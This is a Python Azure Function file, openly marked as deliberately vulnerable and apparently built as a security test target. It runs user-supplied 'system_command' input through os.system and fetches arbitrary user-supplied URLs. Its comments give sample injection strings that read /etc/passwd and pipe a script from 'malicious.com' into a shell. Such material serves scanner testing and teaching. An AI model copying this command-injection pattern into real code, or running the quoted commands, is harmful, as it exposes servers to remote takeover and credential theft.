import azure.functions as func
import json
import logging
import os
import requests

# SECURITY VULNERABILITY: Command Injection via os.system
# This function executes user-provided system commands without validation,
# leading to arbitrary command execution.

# VULNERABILITIES:
# 1. Command injection via os.system with user input (CRITICAL)
# 2. Uses requests 2.20.0 which has CVE-2018-18074 (CRLF injection)

def main(req: func.HttpRequest) -> func.HttpResponse:
    """
    Azure Function that executes system diagnostics and makes HTTP requests.
    """
    logging.info('Python HTTP trigger function processed a request.')

    try:
        req_body = req.get_json()

        # VULNERABILITY: Command Injection
        # User input is directly passed to os.system without sanitization
        if 'system_command' in req_body:
            command = req_body['system_command']
            logging.info(f'Executing system command: {command}')

            # DANGEROUS: os.system with user-controlled input
            # An attacker can inject commands like: "ls; cat /etc/passwd" or "wget malicious.com/shell.sh | sh"
            result = os.system(command)

            return func.HttpResponse(
                json.dumps({
                    'message': 'Command executed',
                    'exit_code': result
                }),
                mimetype='application/json',
                status_code=200
            )

        # Make HTTP request using vulnerable requests library
        if 'url' in req_body:
            url = req_body['url']
            try:
                response = requests.get(url, timeout=10)
                return func.HttpResponse(
                    json.dumps({
                        'message': 'HTTP request completed',
                        'status_code': response.status_code,
                        'content_length': len(response.content)
                    }),
                    mimetype='application/json',
                    status_code=200
                )
            except requests.RequestException as e:
                return func.HttpResponse(
                    json.dumps({'error': str(e)}),
                    mimetype='application/json',
                    status_code=500
                )

        return func.HttpResponse(
            json.dumps({'message': 'Diagnostic service ready'}),
            mimetype='application/json',
            status_code=200
        )

    except ValueError:
        return func.HttpResponse(
            json.dumps({'error': 'Invalid JSON body'}),
            mimetype='application/json',
            status_code=400
        )
    except Exception as e:
        return func.HttpResponse(
            json.dumps({'error': str(e)}),
            mimetype='application/json',
            status_code=500
        )
